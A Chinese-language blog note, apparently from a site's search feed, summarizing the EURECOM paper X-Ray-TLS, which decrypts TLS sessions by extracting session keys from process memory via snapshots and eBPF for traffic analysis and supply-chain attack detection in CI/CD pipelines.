    <content type="html"><![CDATA[<p>法国通信系统工程师学校与研究中心(EURECOM)| X-Ray-TLS:通过从内存中提取会话密钥对TLS会话进行透明解密</p><img src="/2024/09/26/France-EURECOM-X-Ray-TLS/c309aba5-a6ed-4353-b335-b83dfb0ed30a.png" class="" title="c309aba5-a6ed-4353-b335-b83dfb0ed30a.png"><blockquote><p><em>原文标题：X-Ray-TLS: transparent decryption of TLS sessions by extracting session keys from memory</em><br><em>原文作者： Florent Moriconi, Olivier Levillain, Aurélien Francillon, Raphael Troncy</em><br><em>发表期刊： ACM ASIA Conference on Computer and Communications Security (ACM ASIACCS)</em><br><em>原文链接：<a href="https://dl.acm.org/doi/10.1145/3634737.3637654">https://dl.acm.org/doi/10.1145/3634737.3637654</a></em><br><em>主题类型：流量解密</em> </p></blockquote><h1 id="研究背景"><a href="#研究背景" class="headerlink" title="研究背景"></a>研究背景</h1><p>传统的TLS拦截方法（如中间人攻击和HTTPS代理）通常复杂且具有侵入性。需要一种更简单且不侵入的方式来解密TLS会话，以便在不影响安全性的情况下进行流量分析。</p><h1 id="方法与实现"><a href="#方法与实现" class="headerlink" title="方法与实现"></a>方法与实现</h1><ul><li>X-Ray-TLS方法<ul><li>通过比较两次内存快照之间的差异，提取会话密钥来透明地解密TLS会话。</li><li>利用现有的内核功能和eBPF来从进程内存中提取TLS会话密钥。</li><li>支持TLS 1.2、TLS 1.3和QUIC协议。</li><li>适用于多种TLS库和应用程序，特别是在CI&#x2F;CD管道中检测软件供应链攻击。</li><li>不需要修改目标程序或使用虚拟机监控程序。</li></ul></li><li>整体架构</li></ul><img src="/2024/09/26/France-EURECOM-X-Ray-TLS/ce40b590-45a9-4d2e-82e4-35b131d04f75.png" class="" title="ce40b590-45a9-4d2e-82e4-35b131d04f75.png"><ul><li>X-Ray-TSL与其他方法对比</li></ul><img src="/2024/09/26/France-EURECOM-X-Ray-TLS/8cba8e95-27d9-4dbf-a43f-5fa0cb5c5f75.png" class="" title="8cba8e95-27d9-4dbf-a43f-5fa0cb5c5f75.png"><h1 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h1><ul><li><p>内存快照策略:</p><ul><li>使用软脏位（soft-dirty bit）来跟踪内存页面的变化。</li><li>提供五种内存快照策略，从完整转储到部分转储，优化性能和减少冻结时间 。</li></ul></li><li><p>五种快照策略的冻结时间对比</p></li></ul><img src="/2024/09/26/France-EURECOM-X-Ray-TLS/d86403d7-06a6-445b-9ffc-aed980950df6.png" class="" title="d86403d7-06a6-445b-9ffc-aed980950df6.png"><p>其中full-partial-rst方法的冻结时间最少</p><h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><ul><li>CI环境（Continuous Integration）:<ul><li>适用于企业网络和CI环境，帮助检测信息泄露、确保工件可追溯性，并支持构建失败的根本原因分析 。</li></ul></li><li>通用性:<ul><li>与其他TLS检查方法（如MITM和HTTPS代理）相比，X-Ray-TLS不需要目标程序的配合，并且在不同的TLS库中具有通用性</li></ul></li></ul><h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><p>计划使用数据驱动技术来改进密钥提取和模式检测。这将有助于自动发现密钥存储模式，从而将密钥搜索集中在特定的内存区域</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>X-Ray-TLS提供了一种高效且不侵入的TLS流量解密方法，适用于多种实际应用场景，特别是在CI&#x2F;CD管道中。其实现已在GitHub上发布，并得到了法国国家研究机构的支持。展示了X-Ray-TLS在TLS流量解密中的创新性和实用性。</p>]]></content>
    
    
    <categories>
      
      <category>论文笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>流量加解密</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
